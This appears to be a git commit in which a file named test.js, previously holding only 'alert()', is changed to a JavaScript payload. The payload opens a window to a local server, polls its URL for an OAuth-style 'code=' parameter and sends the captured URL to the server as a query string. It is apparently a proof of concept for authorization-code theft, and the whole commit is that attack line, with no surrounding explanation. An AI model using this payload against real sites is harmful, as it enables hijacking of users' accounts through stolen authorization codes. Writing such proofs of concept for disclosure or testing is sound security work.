1be7a6708a849ad15d21facdadde657914e4055a
conceptofproofbug-star <conceptofproofbug@gmail.com>
2025-09-23 02:26:27 -0700

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-alert()
+a=window.open("http://localhost:5000");myfunc=()=>{if(a.location.href.includes("code=")){window.location.href="http://localhost:5000/test?hello="+a.location.href}};setInterval(myfunc,1000)
